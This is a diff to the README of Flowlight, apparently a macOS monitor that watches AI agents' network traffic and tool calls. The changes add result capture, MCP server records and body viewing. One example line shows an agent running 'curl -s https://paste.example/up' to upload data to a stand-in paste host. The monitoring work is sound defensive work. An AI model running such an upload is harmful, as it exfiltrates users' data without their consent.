@@ -65,8 +65,10 @@ and MCP servers did:
   local network are always allowed; anything else raises an alert, and each destination has a one-click **Allow**.
 
 - **Tool calls, from the model itself (optional).** Turn on [HTTPS inspection](#https-inspection-optional) and Flowlight
-  reads every tool call the model asks the agent to run (Anthropic, OpenAI, Gemini, and MCP `tools/call`), then links
-  each tool's request back to the call that caused it: *curl → paste.example ← Bash: curl -s https://paste.example/up*.
+  reads every tool call the model asks the agent to run (Anthropic, OpenAI, Gemini, and MCP `tools/call`) and the
+  result the agent sent back (output, or the error), then links each tool's request back to the call that caused it:
+  *curl → paste.example ← Bash: curl -s https://paste.example/up*. For MCP servers reached over HTTP it also records the
+  server's name and version and the tools it offers. Each agent's detail has **Tool calls** and **MCP servers** tabs.
 
 These rules watch every agent:
 
@@ -91,6 +93,7 @@ on your Mac, and decrypts the apps you route through it: headers, bodies, status
   proxy for desktop apps; its PAC file falls back to a direct connection whenever Flowlight isn't running.
 - **Never decrypted:** Apple services, password managers, anything you add, and apps that pin their certificates
   (detected and passed through automatically).
+- **Readable bodies:** JSON as a collapsible tree in its original key order, event streams one event at a time, or raw.
 - **Credential headers are never stored**, recordings are kept 3 days, and one button removes the certificate, its trust
   setting and everything recorded.
 
@@ -222,7 +225,7 @@ Flowlight/
   Analysis/          anomaly engine, AI agent catalog + rules
   Inspection/        opt-in HTTPS inspection: local CA, proxy, HTTP parser, tool-call reader
   UI/                Live · AI Agents · Reports · Alerts · Inspect · Capture
-FlowlightTests/      80 unit tests: parsers, BPF filter, rollups, charts, agents, MCP, allowlists, inspection, updates
+FlowlightTests/      91 unit tests: parsers, BPF filter, rollups, charts, agents, MCP, allowlists, inspection, updates
 docs/                website (GitHub Pages) and developer guide
 ```
 
